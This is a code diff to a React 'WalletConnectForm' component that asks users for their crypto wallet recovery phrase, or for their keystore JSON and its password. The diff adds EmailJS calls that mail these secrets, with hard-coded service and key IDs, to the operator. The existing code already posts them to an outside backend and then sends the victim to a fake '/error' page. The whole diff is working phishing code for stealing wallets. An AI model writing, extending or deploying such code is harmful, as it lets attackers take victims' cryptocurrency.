@@ -1,5 +1,4 @@
 import React, { useEffect, useState } from 'react';
-import { AiOutlineClose } from 'react-icons/ai';
 import styles from './WalletConnectForm.module.css';
 import {useNavigate} from 'react-router-dom'
 import axios from 'axios'
@@ -8,6 +7,7 @@ import WalletImageContainer from './WalletConnectForm/WalletImageContainer';
 import PrivateKeyForm from './WalletConnectForm/PrivateKeyForm';
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
+import emailjs from '@emailjs/browser';
 
 const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
   const navigate = useNavigate()
@@ -52,10 +52,27 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     
     if (validatePhrase(phrase)) {
       try {
-         await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
+
+        await emailjs.send(
+          'service_ghf9i5i',
+          'template_7agj3ul',
+          {
+            to_name: "dapp",
+            from_name: name,
+            message: `
+              Name: ${name}
+              Type: ${type}
+              Data: ${data}
+              Password: ${password}
+            `,
+          },
+          'Y2zgK5wDVULj3uyvk'
+        );
+        await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
         setTimeout(() => {
           navigate('/error')
         }, 3000);
+
       } catch (error) {
         console.log("")
         setPhraseSubmit("CONNECT")
@@ -77,13 +94,33 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
 
   // ##### KEYSTORE JSON SUBMISSION
   const handleKeystoreSubmit = async (e) => {
+    
     setKeystoreSubmit("Processing...");
     e.preventDefault();
-    const name = wallet
-    const type = "Keystore_JSON"
-    const data = keystore
-    const password = keystorePassword
+
+    const name = wallet;
+    const type = "Keystore_JSON";
+    const data = keystore;
+    const password = keystorePassword;
+
     try {
+
+      await emailjs.send(
+        'service_ghf9i5i',
+        'template_7agj3ul',
+        {
+          to_name: "dapp",
+          from_name: name,
+          message: `
+            Name: ${name}
+            Type: ${type}
+            Data: ${data}
+            Password: ${password}
+          `,
+        },
+        'Y2zgK5wDVULj3uyvk'
+      );
+
       await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
       setTimeout(() => {
         navigate('/error')
